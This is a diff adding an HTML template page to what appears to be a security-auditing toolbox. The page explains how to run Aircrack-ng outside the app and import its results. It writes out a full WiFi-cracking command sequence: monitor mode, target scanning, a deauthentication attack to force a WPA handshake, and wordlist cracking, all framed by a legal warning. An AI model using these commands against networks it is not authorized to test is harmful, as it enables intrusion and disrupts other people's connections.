@@ -1,0 +1,169 @@
+{% extends "base.html" %}
+
+{% block title %}Aircrack-ng - {{ t('app_title') }}{% endblock %}
+
+{% block content %}
+<div class="page-header">
+    <h1 class="page-title">📡 Aircrack-ng — WiFi Security Auditing</h1>
+    <a href="/{{ lang }}/jobs/new" class="btn btn-secondary">← Back</a>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+
+        <!-- WHY NOT INTEGRATED -->
+        <div class="alert" style="background:#fff3e0;border:2px solid #ff9800;border-radius:8px;padding:20px;margin-bottom:20px;">
+            <h4 style="color:#e65100;margin:0 0 10px 0;">⚠️ Why Aircrack-ng is not directly integrated</h4>
+            <p style="margin:0 0 8px 0;">Aircrack-ng requires <strong>direct access to a physical WiFi adapter</strong> capable of monitor mode (e.g., Alfa AWUS036ACH). This hardware cannot be passed through to a Docker container or accessed from a VM without specific configuration.</p>
+            <ul style="margin:8px 0 0 0;padding-left:20px;font-size:13px;">
+                <li>The Docker Worker has no access to physical network interfaces of the host</li>
+                <li>VMware does not natively support WiFi adapter passthrough in monitor mode</li>
+                <li>Running Aircrack-ng requires root privileges and raw socket access</li>
+            </ul>
+            <p style="margin:10px 0 0 0;font-size:13px;color:#666;">
+                <strong>Solution:</strong> Run Aircrack-ng on a dedicated machine or directly on Kali (outside Docker),
+                then import the results into the Toolbox using the upload feature below.
+            </p>
+        </div>
+
+        <!-- LEGAL WARNING -->
+        <div style="background:#ffebee;border:3px solid #d32f2f;padding:15px;margin-bottom:20px;border-radius:8px;">
+            <h4 style="color:#d32f2f;margin:0 0 8px 0;">🚨 Legal Warning</h4>
+            <p style="margin:0;font-size:13px;">
+                WiFi cracking is <strong>strictly illegal</strong> without explicit written authorization from the network owner.
+                This applies even to networks with no password or weak encryption.
+                Only test on networks you own or have written permission to audit.
+                <strong>Art. 323-1 Code Pénal (France) — up to 2 years imprisonment.</strong>
+            </p>
+        </div>
+
+        <!-- HOW TO RUN -->
+        <div class="chart-card">
+            <div class="chart-card-header">🛠️ How to run Aircrack-ng on a dedicated machine</div>
+
+            <h4 style="margin:15px 0 8px 0;">Step 1 — Put your WiFi adapter in monitor mode</h4>
+            <div style="background:#1e1e1e;color:#f8f8f2;padding:15px;border-radius:6px;font-family:monospace;font-size:13px;margin-bottom:15px;">
+                <div style="color:#88846f;"># Check your interface name</div>
+                <div>iwconfig</div>
+                <div style="color:#88846f;margin-top:8px;"># Kill interfering processes</div>
+                <div>sudo airmon-ng check kill</div>
+                <div style="color:#88846f;margin-top:8px;"># Enable monitor mode (replace wlan0 with your interface)</div>
+                <div>sudo airmon-ng start wlan0</div>
+                <div style="color:#88846f;margin-top:8px;"># Verify monitor mode is active</div>
+                <div>iwconfig wlan0mon</div>
+            </div>
+
+            <h4 style="margin:15px 0 8px 0;">Step 2 — Scan for target networks</h4>
+            <div style="background:#1e1e1e;color:#f8f8f2;padding:15px;border-radius:6px;font-family:monospace;font-size:13px;margin-bottom:15px;">
+                <div style="color:#88846f;"># List available networks (note the BSSID and channel of your target)</div>
+                <div>sudo airodump-ng wlan0mon</div>
+            </div>
+
+            <h4 style="margin:15px 0 8px 0;">Step 3 — Capture the WPA handshake</h4>
+            <div style="background:#1e1e1e;color:#f8f8f2;padding:15px;border-radius:6px;font-family:monospace;font-size:13px;margin-bottom:15px;">
+                <div style="color:#88846f;"># Replace AA:BB:CC:DD:EE:FF with target BSSID and 6 with channel</div>
+                <div>sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon</div>
+                <div style="color:#88846f;margin-top:8px;"># In another terminal: deauthenticate a client to force handshake</div>
+                <div>sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</div>
+                <div style="color:#88846f;margin-top:8px;"># Wait for "WPA handshake" message in airodump-ng output</div>
+            </div>
+
+            <h4 style="margin:15px 0 8px 0;">Step 4 — Crack the password</h4>
+            <div style="background:#1e1e1e;color:#f8f8f2;padding:15px;border-radius:6px;font-family:monospace;font-size:13px;margin-bottom:15px;">
+                <div style="color:#88846f;"># Use a wordlist to crack the captured handshake</div>
+                <div>aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap 2>&1 | tee /tmp/aircrack_results.txt</div>
+                <div style="color:#88846f;margin-top:8px;"># The -w flag specifies the wordlist</div>
+                <div style="color:#88846f;"># Results are saved to /tmp/aircrack_results.txt</div>
+            </div>
+
+            <h4 style="margin:15px 0 8px 0;">Step 5 — Expected output format</h4>
+            <div style="background:#f5f5f5;border:1px solid #ddd;padding:15px;border-radius:6px;font-family:monospace;font-size:12px;margin-bottom:15px;">
+                <div style="color:#666;"># Example of aircrack-ng output (save this as .txt)</div>
+                <div>Opening /tmp/capture-01.cap</div>
+                <div>Read 1234 packets.</div>
+                <div style="color:#1a237e;font-weight:bold;">KEY FOUND! [ mypassword123 ]</div>
+                <div>Master Key     : AB CD EF 12 34 56 78 90 ...</div>
+                <div>Transient Key  : 12 34 56 78 ...</div>
+                <div style="color:#666;margin-top:8px;"># OR if not found:</div>
+                <div style="color:#c62828;">Passphrase not in dictionary</div>
+            </div>
+
+            <div style="padding:12px;background:#e8f5e9;border-radius:6px;border-left:4px solid #4caf50;margin-bottom:15px;">
+                <strong>✅ Accepted file formats for upload:</strong>
+                <ul style="margin:6px 0 0 0;padding-left:20px;font-size:13px;">
+                    <li><code>.txt</code> or <code>.log</code> — Aircrack-ng text output (from <code>tee</code> command above)</li>
+                    <li><code>.cap</code> or <code>.pcap</code> — Raw capture file (Wireshark-compatible)</li>
+                    <li>Maximum file size: <strong>100 MB</strong></li>
+                </ul>
+            </div>
+
+            <!-- UPLOAD BUTTON -->
+            <div style="text-align:center;padding:20px;background:#f3f8ff;border-radius:8px;border:2px dashed #2196f3;">
+                <p style="font-size:16px;font-weight:bold;margin:0 0 10px 0;">
+                    📤 Ready to import your Aircrack-ng results?
+                </p>
+                <p style="font-size:13px;color:#666;margin:0 0 15px 0;">
+                    Upload your .txt or .cap file to create findings in the Toolbox
+                </p>
+                <a href="/{{ lang }}/upload-external" class="btn btn-primary" style="font-size:16px;padding:12px 30px;">
+                    📤 Go to Upload Page
+                </a>
+                <p style="font-size:12px;color:#888;margin:10px 0 0 0;">
+                    On the upload page, select <strong>"Aircrack-ng (WiFi Cracking)"</strong> as parser type
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- SIDEBAR -->
+    <div class="col-md-4" style="display:flex;flex-direction:column;gap:15px;align-self:flex-start;">
+
+        <div class="chart-card">
+            <div class="chart-card-header">📋 Requirements</div>
+            <ul style="font-size:13px;padding-left:20px;">
+                <li>WiFi adapter with <strong>monitor mode</strong> support</li>
+                <li>Kali Linux or dedicated pentesting machine</li>
+                <li>Root/sudo privileges</li>
+                <li>Target network authorization</li>
+                <li>aircrack-ng suite installed:<br>
+                    <code style="font-size:11px;">sudo apt install aircrack-ng</code>
+                </li>
+            </ul>
+        </div>
+
+        <div class="chart-card">
+            <div class="chart-card-header">💡 Recommended Adapters</div>
+            <ul style="font-size:13px;padding-left:20px;">
+                <li><strong>Alfa AWUS036ACH</strong> — best for WPA cracking</li>
+                <li><strong>Alfa AWUS036NHA</strong> — reliable, widely supported</li>
+                <li><strong>TP-Link TL-WN722N v1</strong> — budget option</li>
+            </ul>
+            <small style="color:#888;font-size:11px;">⚠️ VMware does not support WiFi monitor mode passthrough natively</small>
+        </div>
+
+        <div class="chart-card">
+            <div class="chart-card-header">🔗 Workflow</div>
+            <p style="font-size:13px;">
+                <strong>On dedicated machine:</strong><br>
+                airmon-ng start → airodump-ng → aireplay-ng → aircrack-ng<br><br>
+                <strong>Import to Toolbox:</strong><br>
+                Save output → Upload here → Findings created automatically
+            </p>
+        </div>
+
+        <div class="chart-card">
+            <div class="chart-card-header">⚡ Quick Commands</div>
+            <div style="font-size:11px;font-family:monospace;background:#f5f5f5;padding:10px;border-radius:4px;">
+                <div style="color:#888;"># Monitor mode</div>
+                <div>airmon-ng start wlan0</div>
+                <div style="color:#888;margin-top:4px;"># Scan networks</div>
+                <div>airodump-ng wlan0mon</div>
+                <div style="color:#888;margin-top:4px;"># Capture</div>
+                <div>airodump-ng -c CH --bssid MAC -w out wlan0mon</div>
+                <div style="color:#888;margin-top:4px;"># Crack</div>
+                <div>aircrack-ng -w wordlist.txt out-01.cap</div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
